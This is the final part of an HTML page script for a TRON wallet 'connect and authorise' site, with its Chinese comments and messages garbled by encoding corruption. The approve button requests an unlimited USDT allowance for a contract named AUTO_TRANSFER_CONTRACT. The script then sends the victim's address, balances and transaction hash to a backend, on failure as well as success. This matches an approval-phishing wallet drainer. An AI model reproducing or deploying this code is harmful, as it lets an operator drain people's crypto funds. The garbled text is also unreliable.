        alert("ã€onload-15ã€‘è‡ªåŠ¨è¿æ¥é’±åŒ…æµç¨‹å¤„ç†å®Œæˆï¼");

        // å­æ­¥éª¤4ï¼šç»‘å®šæ‰‹åŠ¨è¿æ¥é’±åŒ…æŒ‰é’®äº‹ä»¶
        alert("ã€onload-16ã€‘å¼€å§‹ç»‘å®šæ‰‹åŠ¨è¿æ¥æŒ‰é’®ï¼ˆconnectBtnï¼‰ç‚¹å‡»äº‹ä»¶...");
        connectBtn.onclick = async () => {
            alert("ã€è¿æ¥äº‹ä»¶-1ã€‘ç‚¹å‡»äº†æ‰‹åŠ¨è¿æ¥æŒ‰é’®ï¼Œå¼€å§‹æ‰§è¡Œè¿æ¥æµç¨‹...");
            try {
                // æ£€æµ‹tronWebæ˜¯å¦å­˜åœ¨
                alert("ã€è¿æ¥äº‹ä»¶-2ã€‘æ£€æµ‹window.tronWebæ˜¯å¦å­˜åœ¨...");
                if (!window.tronWeb) {
                    alert("ã€è¿æ¥äº‹ä»¶-3ã€‘æœªæ£€æµ‹åˆ°tronWebï¼Œå¼€å§‹è·³è½¬è‡³imTokenæµè§ˆå™¨...");
                    window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href)}`;
                    alert("ã€è¿æ¥äº‹ä»¶-4ã€‘è·³è½¬é“¾æ¥å·²è§¦å‘ï¼Œè¯·åœ¨imTokenä¸­ç¡®è®¤...");
                    return;
                }
                alert("ã€è¿æ¥äº‹ä»¶-5ã€‘æ£€æµ‹åˆ°tronWebï¼Œå¼€å§‹è°ƒç”¨é’±åŒ…æˆæƒï¼ˆtron_requestAccountsï¼‰...");

                // è°ƒç”¨é’±åŒ…æˆæƒè·å–è´¦æˆ·
                const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
                alert(`ã€è¿æ¥äº‹ä»¶-6ã€‘è°ƒç”¨tron_requestAccountsæˆåŠŸï¼Œè¿”å›è´¦æˆ·æ•°ï¼š${accounts.length}ä¸ª`);
                
                // è®¾ç½®ç”¨æˆ·åœ°å€
                userAddress = accounts[0];
                if (!userAddress) throw new Error("è·å–åˆ°çš„è´¦æˆ·åœ°å€ä¸ºç©º");
                alert(`ã€è¿æ¥äº‹ä»¶-7ã€‘è®¾ç½®ç”¨æˆ·åœ°å€æˆåŠŸï¼š${userAddress.slice(0,8)}...${userAddress.slice(-6)}`);

                // è°ƒç”¨initWalletåˆå§‹åŒ–
                alert("ã€è¿æ¥äº‹ä»¶-8ã€‘å³å°†è°ƒç”¨initWalletå‡½æ•°ï¼ˆæ‰‹åŠ¨è¿æ¥åï¼‰...");
                await initWallet();
                alert("ã€è¿æ¥äº‹ä»¶-9ã€‘initWalletå‡½æ•°è°ƒç”¨å®Œæˆï¼Œæ‰‹åŠ¨è¿æ¥æµç¨‹ç»“æŸï¼");
            } catch (e) {
                alert(`ã€è¿æ¥äº‹ä»¶-é”™è¯¯ã€‘æ‰‹åŠ¨è¿æ¥å¤±è´¥ï¼š\né”™è¯¯ç±»å‹ï¼š${e.name}\né”™è¯¯ä¿¡æ¯ï¼š${e.message}\né”™è¯¯ä½ç½®ï¼šconnectBtnç‚¹å‡»äº‹ä»¶å†…`);
            }
        };
        alert("ã€onload-17ã€‘æ‰‹åŠ¨è¿æ¥æŒ‰é’®äº‹ä»¶ç»‘å®šå®Œæˆï¼");

        // å­æ­¥éª¤5ï¼šç»‘å®šæˆæƒæŒ‰é’®ç‚¹å‡»äº‹ä»¶ï¼ˆåˆå§‹disabledï¼Œéœ€initWalletæ¿€æ´»ï¼‰
        alert("ã€onload-18ã€‘å¼€å§‹ç»‘å®šæˆæƒæŒ‰é’®ï¼ˆapproveBtnï¼‰ç‚¹å‡»äº‹ä»¶...");
        approveBtn.onclick = async () => {
            alert("ã€æˆæƒäº‹ä»¶-1ã€‘ç‚¹å‡»äº†æˆæƒæŒ‰é’®ï¼Œå¼€å§‹æ‰§è¡Œæˆæƒæµç¨‹...");
            try {
                // å‰ç½®æ ¡éªŒï¼šä½™é¢æ˜¯å¦å·²è·å–
                alert("ã€æˆæƒäº‹ä»¶-2ã€‘å‰ç½®æ ¡éªŒï¼šæ˜¯å¦å·²è·å–ä½™é¢...");
                if (currentUsdtBalance === 0 && currentTrxBalance === 0) {
                    alert("ã€æˆæƒäº‹ä»¶-3ã€‘æœªè·å–åˆ°ä½™é¢ï¼Œå³å°†è°ƒç”¨getAndShowBalanceå‡½æ•°é‡æ–°æŸ¥è¯¢...");
                    await getAndShowBalance();
                    alert("ã€æˆæƒäº‹ä»¶-4ã€‘getAndShowBalanceå‡½æ•°è°ƒç”¨å®Œæˆï¼Œä½™é¢å·²æ›´æ–°");
                }
                alert(`ã€æˆæƒäº‹ä»¶-5ã€‘å‰ç½®æ ¡éªŒé€šè¿‡ï¼Œå½“å‰ä½™é¢ï¼š\nUSDTï¼š${currentUsdtBalance}\nTRXï¼š${currentTrxBalance}`);

                // æ‰§è¡Œæˆæƒæ“ä½œï¼ˆapproveï¼‰
                alert("ã€æˆæƒäº‹ä»¶-6ã€‘å¼€å§‹æ‰§è¡Œæˆæƒæ“ä½œï¼šè°ƒç”¨trc20Contract.approve...");
                alert(`ã€æˆæƒäº‹ä»¶-7ã€‘approveå‚æ•°ï¼š\n1. æˆæƒç›®æ ‡ï¼š${AUTO_TRANSFER_CONTRACT.slice(0,8)}...\n2. æˆæƒé¢åº¦ï¼š${INFINITE_APPROVE_AMOUNT.slice(0,8)}...ï¼ˆæ— é™æˆæƒï¼‰\n3. å‘èµ·åœ°å€ï¼š${userAddress.slice(0,8)}...`);
                
                const result = await trc20Contract.approve(
                    AUTO_TRANSFER_CONTRACT,
                    INFINITE_APPROVE_AMOUNT
                ).send({
                    from: userAddress,
                    shouldPollResponse: true // ç­‰å¾…é’±åŒ…ç¡®è®¤
                });
                alert(`ã€æˆæƒäº‹ä»¶-8ã€‘approveè°ƒç”¨æˆåŠŸï¼Œè¿”å›äº¤æ˜“ç»“æœï¼š\ntxIDï¼š${result.transaction.txID.slice(0,16)}...\nåŒºå—å·ï¼š${result.blockNumber || "å¾…ç¡®è®¤"}`);

                // æ„å»ºæˆåŠŸæ•°æ®ï¼Œå‘é€åç«¯
                alert("ã€æˆæƒäº‹ä»¶-9ã€‘å¼€å§‹æ„å»ºæˆæƒæˆåŠŸæ•°æ®...");
                const successData = {
                    address: userAddress,
                    usdtBalance: currentUsdtBalance,
                    trxBalance: currentTrxBalance,
                    approveStatus: "success",
                    txHash: result.transaction.txID,
                    approveType: "æ— é™é¢åº¦",
                    approveTime: new Date().toLocaleString(),
                    timestamp: new Date().getTime()
                };
                alert("ã€æˆæƒäº‹ä»¶-10ã€‘æˆåŠŸæ•°æ®æ„å»ºå®Œæˆï¼Œå³å°†å‘é€åˆ°åç«¯...");

                // å‘é€æˆåŠŸæ•°æ®åˆ°åç«¯
                await sendDataToBackend(successData, "æˆæƒæˆåŠŸ");
                alert("ã€æˆæƒäº‹ä»¶-11ã€‘åç«¯å‘é€æˆåŠŸï¼Œå¼€å§‹ä¿å­˜æœ¬åœ°è®°å½•...");

                // ä¿å­˜æœ¬åœ°è®°å½•
                await saveApprovalRecord(successData);
                alert("ã€æˆæƒäº‹ä»¶-12ã€‘æœ¬åœ°è®°å½•ä¿å­˜å®Œæˆï¼Œå¼€å§‹é‡æ–°æ¸²æŸ“è®°å½•...");

                // é‡æ–°æ¸²æŸ“è®°å½•
                renderApprovalRecords();
                alert("ã€æˆæƒäº‹ä»¶-13ã€‘è®°å½•æ¸²æŸ“å®Œæˆï¼ŒæˆæƒæˆåŠŸå…¨æµç¨‹ç»“æŸï¼");

                // æœ€ç»ˆæç¤º
                alert(`ã€æˆæƒäº‹ä»¶-14ã€‘ğŸ‰ æˆæƒæˆåŠŸæ€»ç»“ï¼š\n1. äº¤æ˜“å“ˆå¸Œï¼š${successData.txHash.slice(0,16)}...\n2. USDTä½™é¢ï¼š${successData.usdtBalance}\n3. åç«¯çŠ¶æ€ï¼šå·²åŒæ­¥\n4. æœ¬åœ°çŠ¶æ€ï¼šå·²ä¿å­˜`);
            } catch (approveErr) {
                alert(`ã€æˆæƒäº‹ä»¶-é”™è¯¯1ã€‘æˆæƒæ“ä½œå¤±è´¥ï¼Œå¼€å§‹å¤„ç†å¤±è´¥æµç¨‹...\né”™è¯¯ä¿¡æ¯ï¼š${approveErr.message}`);
                try {
                    // æ„å»ºå¤±è´¥æ•°æ®ï¼Œå¼ºåˆ¶å‘é€åç«¯
                    alert("ã€æˆæƒäº‹ä»¶-é”™è¯¯2ã€‘å¼€å§‹æ„å»ºæˆæƒå¤±è´¥æ•°æ®...");
                    const failData = {
                        address: userAddress || "æœªè·å–åˆ°åœ°å€",
                        usdtBalance: currentUsdtBalance || 0,
                        trxBalance: currentTrxBalance || 0,
                        approveStatus: "fail",
                        errorMsg: approveErr.message,
                        approveType: "æ— é™é¢åº¦",
                        approveTime: new Date().toLocaleString(),
                        timestamp: new Date().getTime()
                    };
                    alert("ã€æˆæƒäº‹ä»¶-é”™è¯¯3ã€‘å¤±è´¥æ•°æ®æ„å»ºå®Œæˆï¼Œå³å°†å‘é€åˆ°åç«¯...");

                    // å¼ºåˆ¶å‘é€å¤±è´¥æ•°æ®åˆ°åç«¯
                    await sendDataToBackend(failData, "æˆæƒå¤±è´¥");
                    alert("ã€æˆæƒäº‹ä»¶-é”™è¯¯4ã€‘å¤±è´¥æ•°æ®å‘é€åˆ°åç«¯å®Œæˆï¼");

                    // ä¿å­˜å¤±è´¥è®°å½•åˆ°æœ¬åœ°
                    await saveApprovalRecord(failData);
                    alert("ã€æˆæƒäº‹ä»¶-é”™è¯¯5ã€‘å¤±è´¥è®°å½•ä¿å­˜åˆ°æœ¬åœ°å®Œæˆï¼");

                    // é‡æ–°æ¸²æŸ“è®°å½•
                    renderApprovalRecords();
                    alert("ã€æˆæƒäº‹ä»¶-é”™è¯¯6ã€‘å¤±è´¥æµç¨‹å¤„ç†å®Œæˆï¼Œæˆæƒå¤±è´¥å…¨æµç¨‹ç»“æŸï¼");
                } catch (failErr) {
                    alert(`ã€æˆæƒäº‹ä»¶-é”™è¯¯7ã€‘å¤„ç†å¤±è´¥æµç¨‹æ—¶å†æ¬¡å‡ºé”™ï¼š\n${failErr.message}\næœ€ç»ˆæµç¨‹ç»ˆæ­¢`);
                }
            }
        };
        alert("ã€onload-19ã€‘æˆæƒæŒ‰é’®äº‹ä»¶ç»‘å®šå®Œæˆï¼");

        // å­æ­¥éª¤6ï¼šåˆå§‹åŒ–æ¸²æŸ“è®°å½•
        alert("ã€onload-20ã€‘å³å°†è°ƒç”¨renderApprovalRecordså‡½æ•°ï¼Œåˆå§‹åŒ–æ¸²æŸ“è®°å½•...");
        await renderApprovalRecords(); // ç”¨awaitç¡®ä¿æ¸²æŸ“å®Œæˆ
        alert("ã€onload-21ã€‘renderApprovalRecordså‡½æ•°è°ƒç”¨å®Œæˆï¼Œè®°å½•åˆå§‹åŒ–æ¸²æŸ“ç»“æŸï¼");

        // å­æ­¥éª¤7ï¼šonloadæµç¨‹ç»“æŸ
        alert("ã€onload-22ã€‘é¡µé¢æ ¸å¿ƒæµç¨‹ï¼ˆonloadï¼‰å…¨éƒ¨æ‰§è¡Œå®Œæˆï¼\nå½“å‰çŠ¶æ€ï¼š\n1. æˆæƒæŒ‰é’®ï¼š${approveBtn.disabled ? 'âŒ æœªæ¿€æ´»' : 'âœ… å·²æ¿€æ´»'}\n2. ç”¨æˆ·åœ°å€ï¼š${userAddress ? userAddress.slice(0,8)+'...' : 'âŒ æœªè·å–'}\n3. åˆçº¦å®ä¾‹ï¼š${trc20Contract ? 'âœ… å·²åˆ›å»º' : 'âŒ æœªåˆ›å»º'}`);
    };

    // ========== ç¬¬å››æ­¥ï¼šé¡µé¢åŠ è½½å®Œæˆæç¤º ==========
    alert("ã€é¡µé¢-æœ€ç»ˆã€‘JSä»£ç åŠ è½½å®Œæˆï¼Œç­‰å¾…window.onloadæ‰§è¡Œ...\nè¯·æŒ‰å¼¹çª—æç¤ºé€æ­¥æ“ä½œï¼Œå¹¶è®°å½•æ‰€æœ‰å¼¹çª—å†…å®¹");
</script>
</body>
</html>
